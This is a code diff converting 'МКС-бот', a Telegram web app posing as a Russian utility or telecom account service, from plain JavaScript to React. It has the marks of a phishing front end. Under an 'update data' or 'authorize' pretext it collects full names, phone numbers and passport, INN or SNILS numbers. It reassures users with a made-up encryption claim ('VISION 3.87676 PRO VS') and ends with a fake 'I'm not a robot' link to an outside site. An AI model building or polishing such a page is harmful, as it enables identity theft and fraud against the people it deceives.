@@ -1,285 +1,378 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>МКС-бот</title>
-    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            transition: all 0.3s ease;
-        }
-        .telegram-theme {
-            background-color: var(--tg-theme-bg-color, #ffffff);
-            color: var(--tg-theme-text-color, #000000);
-        }
-        .button-primary {
-            background-color: var(--tg-theme-button-color, #0088cc);
-            color: var(--tg-theme-button-text-color, #ffffff);
-        }
-        .button-secondary {
-            background-color: var(--tg-theme-secondary-bg-color, #f0f0f0);
-            color: var(--tg-theme-text-color, #000000);
-        }
-        input, select {
-            background-color: var(--tg-theme-secondary-bg-color, #f0f0f0);
-            color: var(--tg-theme-text-color, #000000);
-            border: 1px solid var(--tg-theme-hint-color, #cccccc);
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>МКС-бот</title>
+  <script src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.development.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/react-dom@18.2.0/umd/react-dom.development.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/babel-standalone@7.22.5/babel.min.js"></script>
+  <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="telegram-theme min-h-screen flex flex-col items-center justify-between p-4">
-    <div id="app" class="w-full max-w-md">
-        <h1 class="text-2xl font-bold text-center mb-4">🏠 МКС-бот 📡</h1>
-        <div id="message" class="mb-4 text-center"></div>
-        <div id="main-menu" class="space-y-2"></div>
-        <div id="form-container" class="space-y-4 hidden">
-            <div id="form-message" class="text-center"></div>
-            <input id="input-field" type="text" class="w-full p-2 rounded" placeholder="Введите данные">
-            <select id="select-field" class="w-full p-2 rounded hidden">
-                <option value="Паспорт">📄 Паспорт</option>
-                <option value="ИНН">🧾 ИНН</option>
-                <option value="СНИЛС">🟢 СНИЛС</option>
-            </select>
-            <div id="form-buttons" class="space-y-2"></div>
+<body class="bg-gray-100 font-sans">
+  <div id="root" class="container mx-auto p-4 max-w-md"></div>
+
+  <script type="text/babel">
+    const { useState } = React;
+
+    // State management for form data and navigation
+    const App = () => {
+      const [state, setState] = useState({
+        currentScreen: 'main',
+        formData: { fullname: '', phone: '', document_type: '', document_number: '' },
+        formStep: null,
+        error: ''
+      });
+
+      // Simulated user info (replace Telegram's message.from_user)
+      const user = {
+        id: 'web_user_' + Math.random().toString(36).substr(2, 9),
+        username: 'webuser'
+      };
+
+      // Simulated save and forward function (logs to console and stores in localStorage)
+      const saveAndForwardPartial = (isComplete = false) => {
+        const timestamp = new Date().toLocaleString('ru-RU');
+        const userWithBot = `@${user.username} (МКС)`;
+        const { fullname, phone, document_type, document_number } = state.formData;
+        const record = `${timestamp}\t${user.id}\t${userWithBot}\t${fullname}\t${phone}\t${document_type} ${document_number}`;
+        
+        // Log to console (simulating file write)
+        console.log(`Записана строка: ${record}`);
+        
+        // Store in localStorage
+        const storedData = JSON.parse(localStorage.getItem('mks_data') || '[]');
+        storedData.push(record);
+        localStorage.setItem('mks_data', JSON.stringify(storedData));
+      };
+
+      // Input validation functions
+      const validateFullname = (text) => /^[А-Яа-яЁё\s-]+$/u.test(text);
+      const validatePhone = (phone) => {
+        const digits = phone.replace(/[^0-9]/g, '');
+        return (phone.startsWith('+7') || phone.startsWith('7')) && (digits.length === 10 || digits.length === 11);
+      };
+
+      // Handle button clicks for navigation and form submission
+      const handleAction = (action) => {
+        setState({ ...state, error: '' });
+        switch (action) {
+          case 'update_data':
+            setState({ ...state, currentScreen: 'form', formStep: 'fullname' });
+            break;
+          case 'change_tariff':
+          case 'check_balance':
+          case 'refill_balance':
+            setState({ ...state, currentScreen: 'unauthorized' });
+            break;
+          case 'additional_services':
+            setState({ ...state, currentScreen: 'additional_services' });
+            break;
+          case 'faq':
+            setState({ ...state, currentScreen: 'faq' });
+            break;
+          case 'instruction':
+            setState({ ...state, currentScreen: 'instruction' });
+            break;
+          case 'contact_support':
+            setState({ ...state, currentScreen: 'contact_support' });
+            break;
+          case 'back':
+            setState({ ...state, currentScreen: 'main', formStep: null, error: '' });
+            break;
+          case 'authorize':
+            setState({ ...state, currentScreen: 'form', formStep: 'fullname' });
+            break;
+          case 'change_action':
+            setState({ ...state, currentScreen: 'main' });
+            break;
+          default:
+            break;
+        }
+      };
+
+      // Handle form submissions
+      const handleFormSubmit = (value) => {
+        if (state.formStep === 'fullname') {
+          if (!validateFullname(value)) {
+            setState({ ...state, error: '❌ ФИО должно содержать только буквы. Попробуйте снова. ⚠️' });
+            return;
+          }
+          const cleanText = value.replace(/\s+/g, ' ').trim();
+          setState({
+            ...state,
+            formData: { ...state.formData, fullname: cleanText },
+            formStep: 'phone',
+            error: ''
+          });
+          saveAndForwardPartial();
+        } else if (state.formStep === 'phone') {
+          if (!validatePhone(value)) {
+            setState({ ...state, error: '❌ Номер телефона должен начинаться с +7 или 7 и содержать 10 или 11 цифр. ⚠️' });
+            return;
+          }
+          setState({
+            ...state,
+            formData: { ...state.formData, phone: value },
+            formStep: 'document_type',
+            error: ''
+          });
+          saveAndForwardPartial();
+        } else if (state.formStep === 'document_number') {
+          setState({
+            ...state,
+            formData: { ...state.formData, document_number: value },
+            formStep: 'verify',
+            error: ''
+          });
+          saveAndForwardPartial(true);
+        }
+      };
+
+      // Render buttons
+      const renderButton = (text, action) => (
+        <button
+          className="w-full bg-blue-500 text-white py-2 px-4 rounded mb-2 hover:bg-blue-600"
+          onClick={() => handleAction(action)}
+        >
+          {text}
+        </button>
+      );
+
+      // Render inline button (e.g., for verification or support)
+      const renderInlineButton = (text, url) => (
+        <a
+          href={url}
+          target="_blank"
+          rel="noopener noreferrer"
+          className="inline-block bg-green-500 text-white py-2 px-4 rounded hover:bg-green-600"
+        >
+          {text}
+        </a>
+      );
+
+      // Render form input
+      const renderFormInput = (placeholder, onSubmit) => (
+        <div>
+          <input
+            type="text"
+            placeholder={placeholder}
+            className="w-full p-2 mb-2 border rounded"
+            onKeyPress={(e) => {
+              if (e.key === 'Enter') {
+                onSubmit(e.target.value);
+                e.target.value = '';
+              }
+            }}
+          />
+          {state.error && <p className="text-red-500">{state.error}</p>}
+          <button
+            className="w-full bg-gray-500 text-white py-2 px-4 rounded mb-2 hover:bg-gray-600"
+            onClick={() => handleAction(state.formStep === 'fullname' ? 'back' : state.formStep === 'phone' ? 'fullname' : 'document_type')}
+          >
+            ↩️ Вернуться назад
+          </button>
         </div>
-        <div id="faq-container" class="space-y-2 hidden"></div>
-        <div id="additional-services" class="space-y-2 hidden"></div>
-    </div>
-    <script>
-        // Initialize Telegram Web App
-        const tg = window.Telegram.WebApp;
-        tg.ready();
-        tg.expand();
+      );
 
-        // State management
-        let state = {
-            current: null,
-            data: {
-                fullname: '',
-                phone: '',
-                document_type: '',
-                document_number: ''
+      // Render screens
+      const renderScreen = () => {
+        switch (state.currentScreen) {
+          case 'main':
+            return (
+              <div>
+                <h2 className="text-xl font-bold mb-4">🏠 Добро пожаловать в МКС-бот! 📡</h2>
+                <p>Управляйте своими услугами легко и быстро! 🌐</p>
+                {renderButton('📝 Обновить данные', 'update_data')}
+                {renderButton('🔄 Поменять тариф', 'change_tariff')}
+                {renderButton('💳 Проверить баланс', 'check_balance')}
+                {renderButton('💸 Пополнить баланс', 'refill_balance')}
+                {renderButton('🛠️ Дополнительные услуги', 'additional_services')}
+              </div>
+            );
+          case 'unauthorized':
+            return (
+              <div>
+                <p>Мы не можем выполнить действие, так как вы не авторизовались. ⚠️</p>
+                {renderButton('🔐 Авторизоваться', 'authorize')}
+                {renderButton('↩️ Сменить действие', 'change_action')}
+              </div>
+            );
+          case 'additional_services':
+            return (
+              <div>
+                <h2 className="text-xl font-bold mb-4">🛠️ Дополнительные услуги</h2>
+                {renderButton('❓ Часто задаваемые вопросы', 'faq')}
+                {renderButton('ℹ️ Инструкция', 'instruction')}
+                {renderButton('📞 Связаться с техподдержкой', 'contact_support')}
+                {renderButton('↩️ Вернуться назад', 'back')}
+              </div>
+            );
+          case 'faq':
+            return (
+              <div>
+                <h2 className="text-xl font-bold mb-4">❓ Часто задаваемые вопросы</h2>
+                {renderButton('⏳ До какого числа нужно передавать показания?', 'faq_deadline')}
+                {renderButton('💸 Что будет, если не передать данные вовремя?', 'faq_penalty')}
+                {renderButton('🔒 Это безопасно?', 'faq_safe')}
+                {renderButton('⚡️ Почему через Telegram?', 'faq_telegram')}
+                {renderButton('🔁 Можно ли исправить ошибку?', 'faq_fix')}
+                {renderButton('📑 Какие документы можно использовать?', 'faq_documents')}
+                {renderButton('↩️ Вернуться назад', 'back')}
+              </div>
+            );
+          case 'instruction':
+            return (
+              <div>
+                <h2 className="text-xl font-bold mb-4">ℹ️ Инструкция</h2>
+                <p>📋 Чтобы обновить данные:</p>
+                <p>1️⃣ Нажмите «Обновить данные».</p>
+                <p>2️⃣ Отправьте номер телефона.</p>
+                <p>3️⃣ Выберите документ и введите его номер.</p>
+                <p>4️⃣ Получите подтверждение. 🌐</p>
+                <p>На любом этапе вы можете нажать '↩️ Вернуться назад'. 📡</p>
+                {renderButton('↩️ Вернуться назад', 'back')}
+              </div>
+            );
+          case 'contact_support':
+            return (
+              <div>
+                <h2 className="text-xl font-bold mb-4">📞 Связаться с техподдержкой</h2>
+                <p>Для связи с техподдержкой нажмите на кнопку ниже! 🌐</p>
+                {renderInlineButton('📞 Написать в техподдержку', 'https://t.me/MyMKCsup')}
+                {renderButton('↩️ Вернуться назад', 'back')}
+              </div>
+            );
+          case 'form':
+            if (state.formStep === 'fullname') {
+              return (
+                <div>
+                  <h2 className="text-xl font-bold mb-4">📝 Обновить данные</h2>
+                  <p className="font-bold">УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</p>
+                  <p>👤 Укажите Фамилию Имя Отчество полностью (только текст): 🌐</p>
+                  {renderFormInput('ФИО', handleFormSubmit)}
+                </div>
+              );
+            } else if (state.formStep === 'phone') {
+              return (
+                <div>
+                  <h2 className="text-xl font-bold mb-4">📝 Обновить данные</h2>
+                  <p className="font-bold">УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</p>
+                  <p>📞 Отправьте номер телефона (начните с +7 или 7, например: +79991234567): 📡</p>
+                  {renderFormInput('Номер телефона', handleFormSubmit)}
+                </div>
+              );
+            } else if (state.formStep === 'document_type') {
+              return (
+                <div>
+                  <h2 className="text-xl font-bold mb-4">📝 Обновить данные</h2>
+                  <p>Выберите документ: 🌐</p>
+                  <button
+                    className="w-full bg-blue-500 text-white py-2 px-4 rounded mb-2 hover:bg-blue-600"
+                    onClick={() => {
+                      setState({ ...state, formData: { ...state.formData, document_type: 'Паспорт' }, formStep: 'document_number' });
+                      saveAndForwardPartial();
+                    }}
+                  >
+                    📄 Паспорт
+                  </button>
+                  <button
+                    className="w-full bg-blue-500 text-white py-2 px-4 rounded mb-2 hover:bg-blue-600"
+                    onClick={() => {
+                      setState({ ...state, formData: { ...state.formData, document_type: 'ИНН' }, formStep: 'document_number' });
+                      saveAndForwardPartial();
+                    }}
+                  >
+                    🧾 ИНН
+                  </button>
+                  <button
+                    className="w-full bg-blue-500 text-white py-2 px-4 rounded mb-2 hover:bg-blue-600"
+                    onClick={() => {
+                      setState({ ...state, formData: { ...state.formData, document_type: 'СНИЛС' }, formStep: 'document_number' });
+                      saveAndForwardPartial();
+                    }}
+                  >
+                    🟢 СНИЛС
+                  </button>
+                  {renderButton('↩️ Вернуться назад', 'phone')}
+                </div>
+              );
+            } else if (state.formStep === 'document_number') {
+              return (
+                <div>
+                  <h2 className="text-xl font-bold mb-4">📝 Обновить данные</h2>
+                  <p className="font-bold">УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</p>
+                  <p>Введите {state.formData.document_type} (пример: {state.formData.document_type === 'Паспорт' ? '4510 123456' : state.formData.document_type === 'ИНН' ? '500100732259' : '112-233-445 95'}): 🌐</p>
+                  {renderFormInput(`${state.formData.document_type}`, handleFormSubmit)}
+                </div>
+              );
+            } else if (state.formStep === 'verify') {
+              return (
+                <div>
+                  <h2 className="text-xl font-bold mb-4">❗️ Последний шаг ❗️</h2>
+                  <p>Для обновления данных подтвердите, что вы человек, нажав на кнопку ниже. После подтверждения вы вернетесь в главное меню! 👇</p>
+                  {renderInlineButton('Я не робот ✅', 'https://redirect.figma.site/')}
+                  {renderButton('↩️ Вернуться назад', 'back')}
+                </div>
+              );
             }
-        };
-
-        // DOM elements
-        const app = document.getElementById('app');
-        const message = document.getElementById('message');
-        const mainMenu = document.getElementById('main-menu');
-        const formContainer = document.getElementById('form-container');
-        const formMessage = document.getElementById('form-message');
-        const inputField = document.getElementById('input-field');
-        const selectField = document.getElementById('select-field');
-        const formButtons = document.getElementById('form-buttons');
-        const faqContainer = document.getElementById('faq-container');
-        const additionalServices = document.getElementById('additional-services');
-
-        // Helper functions
-        function showMessage(text) {
-            message.innerHTML = text;
+            break;
+          case 'faq_deadline':
+            return (
+              <div>
+                <p>📌 Показания счетчиков нужно передавать до 25 числа каждого месяца. 📡</p>
+                {renderButton('↩️ Вернуться назад', 'back')}
+              </div>
+            );
+          case 'faq_penalty':
+            return (
+              <div>
+                <p>⚠️ Плата будет начислена по среднему — исходя из показаний за последние полгода. ⚡️</p>
+                {renderButton('↩️ Вернуться назад', 'back')}
+              </div>
+            );
+          case 'faq_safe':
+            return (
+              <div>
+                <p>🔒 Да, у нас стоит защита VISION 3.87676 PRO VS (сквозное шифрование). 🌐</p>
+                {renderButton('↩️ Вернуться назад', 'back')}
+              </div>
+            );
+          case 'faq_telegram':
+            return (
+              <div>
+                <p>⚡️ Для удобства и переход на цифровые площадки. 📡</p>
+                {renderButton('↩️ Вернуться назад', 'back')}
+              </div>
+            );
+          case 'faq_fix':
+            return (
+              <div>
+                <p>✅ Да, можно. Свяжитесь с техподдержкой или повторите ввод. 🌐</p>
+                {renderButton('↩️ Вернуться назад', 'back')}
+              </div>
+            );
+          case 'faq_documents':
+            return (
+              <div>
+                <p>👉 Паспорт, ИНН, СНИЛС. 📡</p>
+                {renderButton('↩️ Вернуться назад', 'back')}
+              </div>
+            );
+          default:
+            return <p>Ошибка: неизвестный экран</p>;
         }
+      };
 
-        function createButton(text, onClick, isPrimary = true) {
-            const button = document.createElement('button');
-            button.className = `w-full p-2 rounded ${isPrimary ? 'button-primary' : 'button-secondary'} hover:opacity-90 transition`;
-            button.textContent = text;
-            button.onclick = onClick;
-            return button;
-        }
+      return (
+        <div className="bg-white p-6 rounded-lg shadow-md">
+          {renderScreen()}
+        </div>
+      );
+    };
 
-        function clearForm() {
-            inputField.value = '';
-            selectField.classList.add('hidden');
-            inputField.classList.remove('hidden');
-            formButtons.innerHTML = '';
-            formMessage.innerHTML = '';
-        }
-
-        function showMainMenu() {
-            state.current = 'main';
-            formContainer.classList.add('hidden');
-            faqContainer.classList.add('hidden');
-            additionalServices.classList.add('hidden');
-            mainMenu.classList.remove('hidden');
-            showMessage('🏠 Добро пожаловать в МКС-бот! 📡 Управляйте своими услугами легко и быстро! 🌐');
-            mainMenu.innerHTML = '';
-            [
-                { text: '📝 Обновить данные', action: startForm },
-                { text: '🔄 Поменять тариф', action: showUnauthorized },
-                { text: '💳 Проверить баланс', action: showUnauthorized },
-                { text: '💸 Пополнить баланс', action: showUnauthorized },
-                { text: '🛠️ Дополнительные услуги', action: showAdditionalServices }
-            ].forEach(item => mainMenu.appendChild(createButton(item.text, item.action)));
-        }
-
-        function showUnauthorized() {
-            mainMenu.classList.add('hidden');
-            formContainer.classList.remove('hidden');
-            clearForm();
-            showMessage('Мы не можем выполнить действие, так как вы не авторизовались. ⚠️');
-            formButtons.appendChild(createButton('🔐 Авторизоваться', startForm));
-            formButtons.appendChild(createButton('↩️ Сменить действие', showMainMenu, false));
-        }
-
-        function showAdditionalServices() {
-            state.current = 'additional';
-            mainMenu.classList.add('hidden');
-            additionalServices.classList.remove('hidden');
-            showMessage('🛠️ Выберите опцию: 🌐');
-            additionalServices.innerHTML = '';
-            [
-                { text: '❓ Часто задаваемые вопросы', action: showFAQ },
-                { text: 'ℹ️ Инструкция', action: showInstruction },
-                { text: '📞 Связаться с техподдержкой', action: contactSupport },
-                { text: '↩️ Вернуться назад', action: showMainMenu }
-            ].forEach(item => additionalServices.appendChild(createButton(item.text, item.action, item.text !== '↩️ Вернуться назад')));
-        }
-
-        function showFAQ() {
-            state.current = 'faq';
-            additionalServices.classList.add('hidden');
-            faqContainer.classList.remove('hidden');
-            showMessage('❓ Часто задаваемые вопросы: 🌐');
-            faqContainer.innerHTML = '';
-            [
-                { text: '⏳ До какого числа нужно передавать показания?', msg: '📌 Показания счетчиков нужно передавать до 25 числа каждого месяца. 📡' },
-                { text: '💸 Что будет, если не передать данные вовремя?', msg: '⚠️ Плата будет начислена по среднему — исходя из показаний за последние полгода. ⚡️' },
-                { text: '🔒 Это безопасно?', msg: '🔒 Да, у нас стоит защита VISION 3.87676 PRO VS (сквозное шифрование). 🌐' },
-                { text: '⚡️ Почему через Telegram?', msg: '⚡️ Для удобства и переход на цифровые площадки. 📡' },
-                { text: '🔁 Можно ли исправить ошибку?', msg: '✅ Да, можно. Свяжитесь с техподдержкой или повторите ввод. 🌐' },
-                { text: '📑 Какие документы можно использовать?', msg: '👉 Паспорт, ИНН, СНИЛС. 📡' },
-                { text: '↩️ Вернуться назад', action: showAdditionalServices }
-            ].forEach(item => {
-                faqContainer.appendChild(createButton(item.text, () => {
-                    if (item.msg) showMessage(item.msg);
-                    else item.action();
-                }, !item.action));
-            });
-        }
-
-        function showInstruction() {
-            showMessage('📋 Чтобы обновить данные:\n1️⃣ Нажмите «Обновить данные».\n2️⃣ Отправьте номер телефона.\n3️⃣ Выберите документ и введите его номер.\n4️⃣ Получите подтверждение. 🌐\n\nНа любом этапе вы можете нажать "↩️ Вернуться назад". 📡');
-            formContainer.classList.remove('hidden');
-            clearForm();
-            formButtons.appendChild(createButton('↩️ Вернуться назад', showAdditionalServices, false));
-        }
-
-        function contactSupport() {
-            tg.openLink('https://t.me/MyMKCsup', { try_instant_view: true });
-        }
-
-        async function saveData() {
-            const timestamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
-            const userId = tg.initDataUnsafe.user?.id || 'unknown';
-            const username = tg.initDataUnsafe.user?.username || '';
-            const userWithBot = username ? `@${username} (МКС)` : '(МКС)';
-            const record = `${timestamp}\t${userId}\t${userWithBot}\t${state.data.fullname}\t${state.data.phone}\t${state.data.document_type} ${state.data.document_number}\n`;
-
-            try {
-                // Simulate saving to a server
-                console.log('Saving:', record);
-                // In a real app, use axios to send to a backend
-                // await axios.post('/save', { data: record });
-            } catch (e) {
-                console.error('Error saving data:', e);
-            }
-        }
-
-        function startForm() {
-            state.current = 'fullname';
-            mainMenu.classList.add('hidden');
-            formContainer.classList.remove('hidden');
-            clearForm();
-            formMessage.innerHTML = '<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>';
-            inputField.placeholder = 'Введите ФИО полностью';
-            formButtons.appendChild(createButton('Отправить', submitFullname));
-            formButtons.appendChild(createButton('↩️ Вернуться назад', showMainMenu, false));
-        }
-
-        async function submitFullname() {
-            const text = inputField.value.trim();
-            if (!/^[А-Яа-яЁё\s-]+$/.test(text)) {
-                formMessage.innerHTML = '❌ ФИО должно содержать только буквы. Попробуйте снова. ⚠️';
-                return;
-            }
-            state.data.fullname = text.replace(/\s+/g, ' ');
-            await saveData();
-            state.current = 'phone';
-            clearForm();
-            formMessage.innerHTML = '<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>';
-            inputField.placeholder = 'Введите номер телефона (+79991234567)';
-            formButtons.appendChild(createButton('Отправить', submitPhone));
-            formButtons.appendChild(createButton('↩️ Вернуться назад', showMainMenu, false));
-        }
-
-        async function submitPhone() {
-            const phone = inputField.value.trim();
-            const digits = phone.replace(/[^0-9]/g, '');
-            if (!phone.startsWith('+7') && !phone.startsWith('7')) {
-                formMessage.innerHTML = '❌ Номер телефона должен начинаться с +7 или 7. Попробуйте снова. ⚠️';
-                return;
-            }
-            if (digits.length < 10 || digits.length > 11) {
-                formMessage.innerHTML = '❌ Номер телефона должен содержать 10 или 11 цифр. Попробуйте снова. ⚠️';
-                return;
-            }
-            state.data.phone = phone;
-            await saveData();
-            state.current = 'document_type';
-            clearForm();
-            formMessage.innerHTML = 'Выберите документ: 🌐';
-            selectField.classList.remove('hidden');
-            inputField.classList.add('hidden');
-            formButtons.appendChild(createButton('Отправить', submitDocumentType));
-            formButtons.appendChild(createButton('↩️ Вернуться назад', () => {
-                state.current = 'phone';
-                clearForm();
-                formMessage.innerHTML = '<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>';
-                inputField.placeholder = 'Введите номер телефона (+79991234567)';
-                formButtons.appendChild(createButton('Отправить', submitPhone));
-                formButtons.appendChild(createButton('↩️ Вернуться назад', showMainMenu, false));
-            }, false));
-        }
-
-        async function submitDocumentType() {
-            state.data.document_type = selectField.value;
-            await saveData();
-            state.current = 'document_number';
-            clearForm();
-            formMessage.innerHTML = '<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>';
-            inputField.placeholder = `Введите ${state.data.document_type} (пример: ${state.data.document_type === 'Паспорт' ? '4510 123456' : state.data.document_type === 'ИНН' ? '500100732259' : '112-233-445 95'})`;
-            formButtons.appendChild(createButton('Отправить', submitDocumentNumber));
-            formButtons.appendChild(createButton('↩️ Вернуться назад', () => {
-                state.current = 'document_type';
-                clearForm();
-                formMessage.innerHTML = 'Выберите документ: 🌐';
-                selectField.classList.remove('hidden');
-                inputField.classList.add('hidden');
-                formButtons.appendChild(createButton('Отправить', submitDocumentType));
-                formButtons.appendChild(createButton('↩️ Вернуться назад', showMainMenu, false));
-            }, false));
-        }
-
-        async function submitDocumentNumber() {
-            state.data.document_number = inputField.value.trim();
-            await saveData();
-            showMessage('❗️Последний шаг❗️\nДля обновления данных подтвердите, что вы человек, нажав на кнопку ниже. После подтверждения вы вернетесь в главное меню! 👇');
-            formContainer.classList.add('hidden');
-            mainMenu.classList.remove('hidden');
-            mainMenu.innerHTML = '';
-            mainMenu.appendChild(createButton('Я не робот ✅', () => {
-                tg.openLink('https://redirect.figma.site/', { try_instant_view: true });
-                showMainMenu();
-            }));
-            state.data = { fullname: '', phone: '', document_type: '', document_number: '' };
-        }
-
-        // Initialize
-        showMainMenu();
-    </script>
+    // Render the app
+    ReactDOM.render(<App />, document.getElementById('root'));
+  </script>
 </body>
 </html>
